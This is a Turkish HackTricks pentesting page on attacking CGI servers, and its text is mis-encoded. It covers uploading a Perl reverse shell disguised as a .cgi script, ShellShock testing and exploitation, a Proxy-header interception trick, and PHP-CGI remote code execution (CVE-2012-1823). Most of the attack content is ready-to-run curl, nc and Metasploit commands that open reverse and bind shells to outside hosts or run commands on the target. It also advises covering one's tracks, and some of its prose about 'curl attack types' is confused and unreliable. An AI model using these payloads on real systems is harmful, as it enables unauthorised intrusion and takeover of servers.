<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizin **HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** isterseniz [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**](https://peass.creator-spring.com)'ni edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>


# Bilgi

**CGI betikleri perl betikleridir**, bu yÃ¼zden, **.cgi** betiklerini Ã§alÄ±ÅŸtÄ±rabilen bir sunucuyu ele geÃ§irdiyseniz, bir perl ters kabuk yÃ¼kleyebilirsiniz \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\), **uzantÄ±yÄ±** **.pl**'den **.cgi**'ye deÄŸiÅŸtirin, **Ã§alÄ±ÅŸtÄ±rma izinleri** verin \(`chmod +x`\) ve web tarayÄ±cÄ±sÄ±ndan ters kabuÄŸa **eriÅŸin** ve Ã§alÄ±ÅŸtÄ±rÄ±n.
**CGI zafiyetlerini** test etmek iÃ§in `nikto -C all` \(ve tÃ¼m eklentileri\) kullanmanÄ±z Ã¶nerilir.

# **ShellShock**

**ShellShock**, Unix tabanlÄ± iÅŸletim sistemlerinde yaygÄ±n olarak kullanÄ±lan **Bash** komut satÄ±rÄ± kabuÄŸunu etkileyen bir **zafiyettir**. Bu, Bash'in uygulamalar tarafÄ±ndan iletilen komutlarÄ± Ã§alÄ±ÅŸtÄ±rma yeteneÄŸini hedefler. Zafiyet, iÅŸlemlerin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± etkileyen dinamik adlÄ± deÄŸerler olan **Ã§evre deÄŸiÅŸkenlerinin** manipÃ¼lasyonunda yatmaktadÄ±r. SaldÄ±rganlar, Ã§evre deÄŸiÅŸkenlerine **zararlÄ± kod** ekleyerek, deÄŸiÅŸkeni aldÄ±klarÄ±nda bu kodun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± saÄŸlayabilir. Bu, saldÄ±rganlarÄ±n potansiyel olarak sistemi ele geÃ§irmesine olanak tanÄ±r.

Bu zafiyeti **sayfa hata verebilir** ÅŸeklinde fark ederek bulabilirsiniz.

Bu zafiyeti **eski bir Apache sÃ¼rÃ¼mÃ¼** ve **cgi\_mod** \(cgi klasÃ¶rÃ¼yle\) kullanarak veya **nikto** kullanarak bulabilirsiniz.

## **Test**

Ã‡oÄŸu test, bir ÅŸeyi ekrana yazdÄ±rÄ±p o dizenin web yanÄ±tÄ±nda dÃ¶ndÃ¼rÃ¼lmesini beklemeye dayanÄ±r. Bir sayfanÄ±n zafiyete aÃ§Ä±k olabileceÄŸini dÃ¼ÅŸÃ¼nÃ¼yorsanÄ±z, tÃ¼m cgi sayfalarÄ±nÄ± arayÄ±n ve bunlarÄ± test edin.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(yansÄ±tÄ±lan, kÃ¶r ve baÄŸÄ±msÄ±z\)**

Curl, bir web uygulamasÄ±nÄ±n gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in yaygÄ±n olarak kullanÄ±lan bir komut satÄ±rÄ± aracÄ±dÄ±r. Curl, HTTP, HTTPS, FTP, SMTP ve diÄŸer birÃ§ok protokolÃ¼ destekler. Bu nedenle, bir web uygulamasÄ±nÄ± hedef alÄ±rken Curl'Ã¼ kullanmak oldukÃ§a faydalÄ± olabilir.

### **YansÄ±tÄ±lan Curl**

YansÄ±tÄ±lan Curl saldÄ±rÄ±larÄ±, kullanÄ±cÄ±nÄ±n girdilerinin doÄŸrudan web uygulamasÄ± tarafÄ±ndan yanÄ±t olarak dÃ¶ndÃ¼rÃ¼ldÃ¼ÄŸÃ¼ durumlarda gerÃ§ekleÅŸtirilir. Bu saldÄ±rÄ± tÃ¼rÃ¼, kullanÄ±cÄ±nÄ±n girdilerini manipÃ¼le ederek, kÃ¶tÃ¼ niyetli kod enjekte etmek veya hassas verileri Ã§almak iÃ§in kullanÄ±labilir.

### **KÃ¶r Curl**

KÃ¶r Curl saldÄ±rÄ±larÄ±, web uygulamasÄ±nÄ±n yanÄ±tÄ±nÄ± doÄŸrudan gÃ¶remediÄŸimiz durumlarda gerÃ§ekleÅŸtirilir. Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan, web uygulamasÄ±nÄ±n yanÄ±tÄ±nÄ± baÅŸka bir kanal aracÄ±lÄ±ÄŸÄ±yla alÄ±r. Ã–rneÄŸin, saldÄ±rgan, bir DNS sunucusuna istek gÃ¶ndererek veya bir e-posta gÃ¶ndererek yanÄ±tÄ± alabilir.

### **BaÄŸÄ±msÄ±z Curl**

BaÄŸÄ±msÄ±z Curl saldÄ±rÄ±larÄ±, web uygulamasÄ±nÄ±n yanÄ±tÄ±nÄ± beklemek yerine, saldÄ±rganÄ±n kontrol ettiÄŸi bir sunucuya yanÄ±tÄ± gÃ¶nderdiÄŸi durumlarda gerÃ§ekleÅŸtirilir. Bu saldÄ±rÄ± tÃ¼rÃ¼, saldÄ±rganÄ±n hedef web uygulamasÄ±na zarar vermek veya hassas verileri Ã§almak iÃ§in kullanÄ±labilir.
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## SÃ¶mÃ¼rÃ¼

Exploiting, bir hedef sistemdeki zayÄ±flÄ±klarÄ± veya gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kullanarak yetkisiz eriÅŸim elde etmek veya hedef sistemde istenmeyen bir davranÄ±ÅŸ gerÃ§ekleÅŸtirmek anlamÄ±na gelir. Bu bÃ¶lÃ¼mde, CGI (Common Gateway Interface) hizmetlerini hedef alarak nasÄ±l sÃ¶mÃ¼rÃ¼ yapabileceÄŸinizi Ã¶ÄŸreneceksiniz.

### CGI SÃ¶mÃ¼rÃ¼sÃ¼

CGI, web sunucusu ve harici programlar arasÄ±nda iletiÅŸim saÄŸlayan bir protokoldÃ¼r. CGI hizmetlerini hedef alarak sÃ¶mÃ¼rÃ¼ yapmak, hedef sistemdeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kullanarak yetkisiz eriÅŸim elde etmek veya hedef sistemde istenmeyen bir davranÄ±ÅŸ gerÃ§ekleÅŸtirmek anlamÄ±na gelir.

CGI hizmetlerini sÃ¶mÃ¼rmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Hedef web uygulamasÄ±nda CGI hizmetlerini belirleyin.
2. CGI hizmetlerinin gÃ¼venlik aÃ§Ä±klarÄ±nÄ± araÅŸtÄ±rÄ±n ve zayÄ±f noktalarÄ±nÄ± belirleyin.
3. SÃ¶mÃ¼rÃ¼ iÃ§in uygun bir saldÄ±rÄ± vektÃ¶rÃ¼ seÃ§in.
4. SÃ¶mÃ¼rÃ¼yÃ¼ gerÃ§ekleÅŸtirmek iÃ§in gerekli araÃ§larÄ± kullanÄ±n.
5. SÃ¶mÃ¼rÃ¼ sonucunda elde edilen yetkisiz eriÅŸimi veya istenmeyen davranÄ±ÅŸÄ± kullanarak hedef sistemde istediÄŸiniz iÅŸlemleri gerÃ§ekleÅŸtirin.

CGI hizmetlerini sÃ¶mÃ¼rmek iÃ§in yaygÄ±n olarak kullanÄ±lan bazÄ± saldÄ±rÄ± vektÃ¶rleri ÅŸunlardÄ±r:

- Command Injection (Komut Enjeksiyonu): Hedef sistemdeki komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r.
- File Inclusion (Dosya Dahil Etme): Hedef sistemdeki dosyalara eriÅŸmek veya Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r.
- Remote Code Execution (Uzaktan Kod YÃ¼rÃ¼tme): Hedef sistemdeki uzaktan kod yÃ¼rÃ¼tme yeteneÄŸini kullanarak istenmeyen iÅŸlemler gerÃ§ekleÅŸtirir.

CGI hizmetlerini sÃ¶mÃ¼rmek iÃ§in kullanÄ±lan araÃ§lar arasÄ±nda `Metasploit`, `Nmap`, `Burp Suite` ve `ExploitDB` gibi popÃ¼ler araÃ§lar bulunmaktadÄ±r.

CGI hizmetlerini sÃ¶mÃ¼rÃ¼rken dikkate almanÄ±z gereken bazÄ± Ã¶nemli noktalar ÅŸunlardÄ±r:

- Hedef sistemdeki CGI hizmetlerinin gÃ¼ncel olup olmadÄ±ÄŸÄ±nÄ± kontrol edin.
- SÃ¶mÃ¼rÃ¼ yapmadan Ã¶nce hedef sistemdeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tam olarak anlayÄ±n.
- SÃ¶mÃ¼rÃ¼ yaparken iz bÄ±rakmamak iÃ§in gerekli Ã¶nlemleri alÄ±n.
- SÃ¶mÃ¼rÃ¼ sonucunda elde edilen yetkisiz eriÅŸimi veya istenmeyen davranÄ±ÅŸÄ± dikkatli bir ÅŸekilde kullanÄ±n ve hedef sistemde zararlÄ± bir etki bÄ±rakmamaya Ã¶zen gÃ¶sterin.

CGI hizmetlerini sÃ¶mÃ¼rmek, hedef sistemde yetkisiz eriÅŸim elde etmek veya istenmeyen bir davranÄ±ÅŸ gerÃ§ekleÅŸtirmek iÃ§in etkili bir yÃ¶ntem olabilir. Ancak, bu tÃ¼r saldÄ±rÄ±lar yasa dÄ±ÅŸÄ±dÄ±r ve yalnÄ±zca yasal izinlerle gerÃ§ekleÅŸtirilmelidir.
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **Proxy \(Web sunucusu isteklerine MitM\)**

CGI, http isteÄŸindeki her baÅŸlÄ±k iÃ§in bir ortam deÄŸiÅŸkeni oluÅŸturur. Ã–rneÄŸin: "host:web.com" "HTTP\_HOST"="web.com" olarak oluÅŸturulur.

Web sunucusu tarafÄ±ndan HTTP\_PROXY deÄŸiÅŸkeni kullanÄ±labileceÄŸinden, "**Proxy: &lt;IP\_saldÄ±rgan&gt;:&lt;PORT&gt;**" baÅŸlÄ±ÄŸÄ±nÄ± iÃ§eren bir **header** gÃ¶ndermeyi deneyin ve sunucu oturumu sÄ±rasÄ±nda herhangi bir istek yaparsa, sunucu tarafÄ±ndan yapÄ±lan her isteÄŸi yakalayabilirsiniz.

# Eski PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

Temel olarak, cgi etkinse ve php "eski" ise \(&lt;5.3.12 / &lt; 5.4.2\), kodu yÃ¼rÃ¼tebilirsiniz.
Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in, web sunucusunun bazÄ± PHP dosyalarÄ±na parametre gÃ¶ndermeden \(Ã¶zellikle "=" karakterini gÃ¶ndermeden\) eriÅŸmeniz gerekmektedir.
ArdÄ±ndan, bu zafiyeti test etmek iÃ§in Ã¶rneÄŸin `/index.php?-s` \(dikkat `-s`\) adresine eriÅŸebilir ve **uygulamanÄ±n kaynak kodu yanÄ±tta gÃ¶rÃ¼necektir**.

Daha sonra, **RCE** elde etmek iÃ§in bu Ã¶zel sorguyu gÃ¶nderebilirsiniz: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` ve **istek gÃ¶vdesinde yÃ¼rÃ¼tÃ¼lecek PHP kodunu** gÃ¶nderin.
Ã–rnek:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Vuln hakkÄ±nda daha fazla bilgi ve olasÄ± saldÄ±rÄ±lar:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Ã–rneÄŸi**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud github reposuna PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
